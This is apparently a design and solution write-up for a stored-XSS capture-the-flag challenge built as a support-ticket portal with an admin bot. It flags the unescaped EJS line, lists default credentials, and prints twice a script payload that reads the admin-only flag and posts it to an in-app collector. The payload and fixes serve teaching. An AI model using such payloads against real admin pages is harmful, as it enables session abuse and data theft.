# CTF Challenge 2 (Medium) - Stored XSS Analysis

## Project Overview

This is a **Stored XSS (Cross-Site Scripting)** CTF challenge designed to teach players about:
- Stored XSS vulnerabilities in admin workflows
- Same-origin actions from injected JavaScript
- Exfiltration to an in-app collector endpoint (CTF-safe approach)

The application simulates a **support ticket portal** where users submit tickets and administrators review them in a dashboard.

---

## Architecture & Components

### Services

1. **Web Application** (Express + EJS)
   - Node.js 20 Alpine container
   - Express.js web framework
   - EJS templating engine
   - PostgreSQL session storage (connect-pg-simple)
   - Port: 3000 (mapped to 5002 externally)

2. **Database** (PostgreSQL)
   - PostgreSQL 16 Alpine
   - Stores users, tickets, and captures
   - Connection via `DATABASE_URL` environment variable

3. **Admin Bot** (Playwright)
   - Automated browser that simulates an admin user
   - Periodically logs in and visits `/admin/tickets`
   - Executes any JavaScript present in ticket messages
   - Interval: 8 seconds (configurable via `BOT_INTERVAL_MS`)

---

## Database Schema

### Tables

1. **users**
   - `id` (SERIAL PRIMARY KEY)
   - `username` (TEXT UNIQUE NOT NULL)
   - `password_hash` (TEXT NOT NULL) - bcrypt hashed
   - `role` (TEXT NOT NULL DEFAULT 'user') - 'user' or 'admin'

2. **tickets**
   - `id` (SERIAL PRIMARY KEY)
   - `user_id` (INTEGER NOT NULL) - Foreign key to users
   - `subject` (TEXT NOT NULL)
   - `message` (TEXT NOT NULL) - **Vulnerable field for XSS**

3. **captures**
   - `id` (SERIAL PRIMARY KEY)
   - `user_id` (INTEGER NOT NULL) - Foreign key to users
   - `captured_at` (TIMESTAMPTZ DEFAULT NOW())
   - `data` (TEXT NOT NULL) - Stores exfiltrated data

### Default Users

- **tokyo** / rio123 (role: user) - For players to submit tickets
- **admin** / admin123 (role: admin) - Used by admin-bot

---

## Application Routes

### Public Routes
- `GET /` - Homepage
- `GET /auth/login` - Login page
- `POST /auth/login` - Authentication
- `POST /auth/logout` - Logout

### User Routes (requireLogin)
- `GET /tickets/new` - Ticket creation form
- `POST /tickets/new` - Submit ticket
- `GET /my-captures` - View captured data (exfiltration results)

### Admin Routes (requireLogin + requireAdmin)
- `GET /admin/tickets` - **VULNERABLE PAGE** - Displays all tickets
- `GET /admin/flag` - **TARGET ENDPOINT** - Returns the CTF flag

### Collector Endpoint (public, no auth)
- `POST /collector` - Receives exfiltrated data
  - Body: `{ user_id: number, data: string }`
  - Stores data in `captures` table linked to user_id

---

## Vulnerability Analysis

### Primary Vulnerability: Stored XSS

**Location:** `views/admin_tickets.ejs` line 18

```ejs
<div class="ticket-body"><%- t.message %></div>
```

**Issue:**
- Uses `<%- %>` (unescaped output) instead of `<%= %>` (escaped output)
- This allows HTML/JavaScript in ticket messages to be rendered and executed
- When admin views tickets, any JavaScript in the message executes in the admin's context

**Why it's dangerous:**
- Admin has access to `/admin/flag` endpoint
- JavaScript executes with admin's session cookies (same-origin)
- Can make authenticated requests to admin-only endpoints
- Can exfiltrate data to `/collector` endpoint

### Security Issues

1. **No Input Sanitization**
   - Ticket messages are stored directly without sanitization
   - No Content Security Policy (CSP) headers
   - No output encoding in admin view

2. **Collector Endpoint Security**
   - `/collector` accepts any `user_id` without verification
   - No authentication/authorization checks
   - Allows arbitrary users to claim captures (intentional for CTF)

3. **Session Security**
   - Sessions stored in PostgreSQL (good)
   - HttpOnly cookies enabled (good)
   - No SameSite cookie attribute (could be improved)

---

## Attack Flow (Intended Solve)

### Step-by-Step Exploitation

1. **Login as regular user**
   - Username: `tokyo`
   - Password: `rio123`

2. **Create malicious ticket**
   - Navigate to `/tickets/new`
   - Submit a ticket with XSS payload in the message field

3. **XSS Payload Example:**
   ```javascript
   <script>
   fetch('/admin/flag')
     .then(r => r.text())
     .then(flag => {
       fetch('/collector', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ user_id: YOUR_USER_ID, data: flag })
       });
     });
   </script>
   ```

4. **Admin bot execution**
   - Admin bot logs in as `admin`
   - Visits `/admin/tickets` every 8 seconds
   - JavaScript in ticket message executes in admin context
   - Payload fetches `/admin/flag` (admin-only endpoint)
   - Flag is posted to `/collector` with attacker's `user_id`

5. **Retrieve captured data**
   - Attacker visits `/my-captures`
   - Sees the captured flag data

---

## Code Structure

### Key Files

```
med/
├── src/
│   ├── server.js          # Main Express application
│   ├── routes/
│   │   ├── auth.js        # Authentication routes
│   │   └── middleware.js  # requireLogin, requireAdmin
│   └── storage/
│       └── db.js          # Database initialization
├── views/
│   ├── index.ejs          # Homepage
│   ├── login.ejs          # Login page
│   ├── new_ticket.ejs     # Ticket creation form
│   ├── admin_tickets.ejs  # VULNERABLE: Admin ticket view
│   └── captures.ejs       # View captured data
├── bot/
│   ├── bot.js             # Playwright admin bot
│   ├── Dockerfile
│   └── package.json
├── public/
│   └── styles.css         # Styling
├── docker-compose.yml     # Service orchestration
├── Dockerfile             # Web app container
└── package.json           # Dependencies
```

### Dependencies

**Web Application:**
- `express` - Web framework
- `ejs` - Templating engine
- `express-session` - Session management
- `connect-pg-simple` - PostgreSQL session store
- `pg` - PostgreSQL client
- `bcryptjs` - Password hashing
- `dotenv` - Environment variables

**Admin Bot:**
- `playwright` - Browser automation

---

## Configuration & Environment

### Environment Variables

**Web Service:**
- `PORT` - Server port (default: 3000)
- `SESSION_SECRET` - Session encryption secret
- `DATABASE_URL` - PostgreSQL connection string
- `FLAG` - The CTF flag to capture

**Admin Bot:**
- `BASE_URL` - Web application URL (default: http://web:3000)
- `ADMIN_USER` - Admin username (default: admin)
- `ADMIN_PASS` - Admin password (default: admin123)
- `BOT_INTERVAL_MS` - Bot visit interval in milliseconds (default: 8000)

**Database:**
- `POSTGRES_USER` - Database user (default: ctf)
- `POSTGRES_PASSWORD` - Database password (default: ctf)
- `POSTGRES_DB` - Database name (default: ctfdb)

### Docker Compose Setup

- **db**: PostgreSQL service with health checks
- **web**: Express application, depends on db
- **admin-bot**: Playwright bot, depends on web
- Volume: `pgdata` for persistent database storage

---

## Why This Design is CTF-Friendly

1. **No Cookie Theft Required**
   - JavaScript executes in admin's browser context
   - Same-origin requests use admin's session automatically
   - Simpler than cookie exfiltration scenarios

2. **In-App Capture System**
   - `/collector` endpoint stores data in database
   - Players view captures at `/my-captures`
   - No external infrastructure needed (no webhooks, DNS, etc.)
   - Safe for isolated CTF environments

3. **Clear Attack Path**
   - Obvious vulnerability (unescaped output)
   - Clear target (admin-only flag endpoint)
   - Straightforward exfiltration mechanism

4. **Automated Admin Simulation**
   - Admin bot ensures consistent exploitation
   - No manual admin interaction needed
   - Predictable timing for testing

---

## Potential Improvements (For Production)

1. **Fix XSS Vulnerability**
   - Use `<%= %>` (escaped output) instead of `<%- %>`
   - Sanitize user input before storage
   - Implement Content Security Policy (CSP)

2. **Secure Collector Endpoint**
   - Verify user_id matches authenticated user
   - Add rate limiting
   - Validate and sanitize input

3. **Enhanced Session Security**
   - Add SameSite cookie attribute
   - Implement CSRF protection
   - Use secure cookies in production

4. **Input Validation**
   - Validate ticket subject/message length
   - Sanitize all user inputs
   - Use parameterized queries (already done)

5. **Monitoring & Logging**
   - Log suspicious activity
   - Monitor for XSS attempts
   - Alert on admin endpoint access

---

## Testing the Challenge

### Manual Testing Steps

1. Start services:
   ```bash
   docker compose up --build
   ```

2. Access application:
   - http://localhost:5002

3. Login as tokyo:
   - Username: `tokyo`
   - Password: `rio123`

4. Create ticket with payload:
   ```html
   <script>
   fetch('/admin/flag')
     .then(r => r.text())
     .then(flag => {
       fetch('/collector', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ user_id: 1, data: flag })
       });
     });
   </script>
   ```

5. Wait for admin bot (8 seconds)
6. Check `/my-captures` for the flag

### Expected Behavior

- Admin bot logs in every 8 seconds
- Visits `/admin/tickets`
- Executes JavaScript in ticket messages
- Flag is captured and stored
- Player retrieves flag from `/my-captures`

---

## Summary

This challenge demonstrates a classic **stored XSS** vulnerability in an admin interface. The vulnerability allows attackers to execute JavaScript in an administrator's browser context, enabling access to admin-only resources. The design is CTF-friendly with an in-app capture system that doesn't require external infrastructure, making it safe and easy to deploy in isolated environments.

**Key Learning Points:**
- Always escape user-controlled output in templates
- Admin interfaces are high-value targets for XSS
- Same-origin requests can access authenticated resources
- In-app capture systems are practical for CTF challenges

